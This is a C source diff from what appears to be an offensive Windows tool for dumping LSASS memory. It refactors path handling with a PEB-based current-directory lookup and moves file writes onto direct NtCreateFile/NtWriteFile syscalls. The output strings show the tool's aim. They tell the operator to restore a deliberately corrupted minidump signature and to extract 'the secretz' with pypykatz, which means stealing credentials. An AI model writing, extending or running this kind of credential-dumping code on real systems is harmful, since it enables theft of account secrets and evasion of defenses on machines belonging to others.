@@ -2,8 +2,40 @@
 #include "handle.h"
 #include "syscalls.h"
 
+VOID get_full_path(
+    PUNICODE_STRING full_dump_path,
+    LPCSTR filename
+)
+{
+    wchar_t wcFileName[MAX_PATH];
+
+    // add \??\ at the start
+    wcscpy(full_dump_path->Buffer, L"\\??\\");
+    // it is just a filename, add the current directory
+    if (!strrchr(filename, '\\'))
+        wcsncat(full_dump_path->Buffer, get_cwd(), MAX_PATH);
+    // convert the path to wide string
+    mbstowcs(wcFileName, filename, MAX_PATH);
+    // add the file path
+    wcsncat(full_dump_path->Buffer, wcFileName, MAX_PATH);
+    // set the length fields
+    full_dump_path->Length = wcsnlen(full_dump_path->Buffer, MAX_PATH);
+    full_dump_path->Length *= 2;
+    full_dump_path->MaximumLength = full_dump_path->Length + 2;
+}
+
+LPCWSTR get_cwd(VOID)
+{
+    PVOID pPeb;
+    PPROCESS_PARAMETERS pProcParams;
+
+    pPeb = (PVOID)READ_MEMLOC(PEB_OFFSET);
+    pProcParams = *RVA(PPROCESS_PARAMETERS*, pPeb, PROCESS_PARAMETERS_OFFSET);
+    return pProcParams->CurrentDirectory.DosPath.Buffer;
+}
+
 BOOL write_file(
-    LPCSTR fileName,
+    PUNICODE_STRING full_dump_path,
     PBYTE fileData,
     ULONG32 fileLength
 )
@@ -13,23 +45,11 @@ BOOL write_file(
     IO_STATUS_BLOCK IoStatusBlock;
     LARGE_INTEGER largeInteger;
     largeInteger.QuadPart = fileLength;
-    wchar_t wcFilePath[MAX_PATH];
-    wchar_t wcFileName[MAX_PATH];
-    UNICODE_STRING UnicodeFilePath;
-
-    // create a UNICODE_STRING with the file path
-    mbstowcs(wcFileName, fileName, MAX_PATH);
-    wcscpy(wcFilePath, L"\\??\\");
-    wcsncat(wcFilePath, wcFileName, MAX_PATH);
-    UnicodeFilePath.Buffer = wcFilePath;
-    UnicodeFilePath.Length = wcsnlen(UnicodeFilePath.Buffer, MAX_PATH);
-    UnicodeFilePath.Length *= 2;
-    UnicodeFilePath.MaximumLength = UnicodeFilePath.Length + 2;
 
     // init the object attributes
     InitializeObjectAttributes(
         &objAttr,
-        &UnicodeFilePath,
+        full_dump_path,
         OBJ_CASE_INSENSITIVE,
         NULL,
         NULL
@@ -52,15 +72,15 @@ BOOL write_file(
         status == STATUS_OBJECT_NAME_INVALID)
     {
         PRINT_ERR(
-            "The path '%s' is invalid.",
-            fileName
+            "The path '%ls' is invalid.",
+            &full_dump_path->Buffer[4]
         )
         return FALSE;
     }
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtCreateFile", status);
-        PRINT_ERR("Could not write the dump %s", fileName);
+        PRINT_ERR("Could not write the dump %ls", &full_dump_path->Buffer[4]);
         return FALSE;
     }
     // write the dump
@@ -79,37 +99,25 @@ BOOL write_file(
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtWriteFile", status);
-        PRINT_ERR("Could not write the dump %s", fileName);
+        PRINT_ERR("Could not write the dump %ls", &full_dump_path->Buffer[4]);
         return FALSE;
     }
-    DPRINT("The dump has been written to %s", fileName);
+    DPRINT("The dump has been written to %ls", &full_dump_path->Buffer[4]);
     return TRUE;
 }
 
 BOOL create_file(
-    LPCSTR fileName
+    PUNICODE_STRING full_dump_path
 )
 {
     HANDLE hFile;
     OBJECT_ATTRIBUTES objAttr;
     IO_STATUS_BLOCK IoStatusBlock;
-    wchar_t wcFilePath[MAX_PATH];
-    wchar_t wcFileName[MAX_PATH];
-    UNICODE_STRING UnicodeFilePath;
-
-    // create a UNICODE_STRING with the file path
-    mbstowcs(wcFileName, fileName, MAX_PATH);
-    wcscpy(wcFilePath, L"\\??\\");
-    wcsncat(wcFilePath, wcFileName, MAX_PATH);
-    UnicodeFilePath.Buffer = wcFilePath;
-    UnicodeFilePath.Length = wcsnlen(UnicodeFilePath.Buffer, MAX_PATH);
-    UnicodeFilePath.Length *= 2;
-    UnicodeFilePath.MaximumLength = UnicodeFilePath.Length + 2;
 
     // init the object attributes
     InitializeObjectAttributes(
         &objAttr,
-        &UnicodeFilePath,
+        full_dump_path,
         OBJ_CASE_INSENSITIVE,
         NULL,
         NULL
@@ -133,19 +141,19 @@ BOOL create_file(
         status == STATUS_OBJECT_NAME_INVALID)
     {
         PRINT_ERR(
-            "The path '%s' is invalid.",
-            fileName
+            "The path '%ls' is invalid.",
+            &full_dump_path->Buffer[4]
         )
         return FALSE;
     }
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtCreateFile", status);
-        DPRINT_ERR("Could not create file at %s", fileName);
+        DPRINT_ERR("Could not create file at %ls", &full_dump_path->Buffer[4]);
         return FALSE;
     }
     NtClose(hFile); hFile = NULL;
-    DPRINT("File created: %s", fileName);
+    DPRINT("File created: %ls", &full_dump_path->Buffer[4]);
     return TRUE;
 }
 
@@ -315,17 +323,9 @@ BOOL delete_file(
 {
     OBJECT_ATTRIBUTES objAttr;
     wchar_t wcFilePath[MAX_PATH];
-    wchar_t wcFileName[MAX_PATH];
     UNICODE_STRING UnicodeFilePath;
-
-    // create a UNICODE_STRING with the file path
-    mbstowcs(wcFileName, filepath, MAX_PATH);
-    wcscpy(wcFilePath, L"\\??\\");
-    wcsncat(wcFilePath, wcFileName, MAX_PATH);
     UnicodeFilePath.Buffer = wcFilePath;
-    UnicodeFilePath.Length = wcsnlen(UnicodeFilePath.Buffer, MAX_PATH);
-    UnicodeFilePath.Length *= 2;
-    UnicodeFilePath.MaximumLength = UnicodeFilePath.Length + 2;
+    get_full_path(&UnicodeFilePath, filepath);
 
     // init the object attributes
     InitializeObjectAttributes(
@@ -357,17 +357,9 @@ BOOL file_exists(
     LARGE_INTEGER largeInteger;
     largeInteger.QuadPart = 0;
     wchar_t wcFilePath[MAX_PATH];
-    wchar_t wcFileName[MAX_PATH];
     UNICODE_STRING UnicodeFilePath;
-
-    // create a UNICODE_STRING with the file path
-    mbstowcs(wcFileName, filepath, MAX_PATH);
-    wcscpy(wcFilePath, L"\\??\\");
-    wcsncat(wcFilePath, wcFileName, MAX_PATH);
     UnicodeFilePath.Buffer = wcFilePath;
-    UnicodeFilePath.Length = wcsnlen(UnicodeFilePath.Buffer, MAX_PATH);
-    UnicodeFilePath.Length *= 2;
-    UnicodeFilePath.MaximumLength = UnicodeFilePath.Length + 2;
+    get_full_path(&UnicodeFilePath, filepath);
 
     // init the object attributes
     InitializeObjectAttributes(
@@ -512,7 +504,7 @@ void print_success(
     {
         PRINT(
             "The minidump has an invalid signature, restore it running:\nbash restore_signature.sh %s",
-            write_dump_to_disk? &strrchr(dump_path, '\\')[1] : dump_path
+            strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path
         )
     }
     if (write_dump_to_disk)
@@ -521,12 +513,12 @@ void print_success(
         PRINT(
             "Done, to download the dump run:\ndownload %s\nto get the secretz run:\npython3 -m pypykatz lsa minidump %s",
             dump_path,
-            &strrchr(dump_path, '\\')[1]
+            strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path
         )
 #else
         PRINT(
             "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s",
-            &strrchr(dump_path, '\\')[1]
+            strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path
         )
 #endif
     }
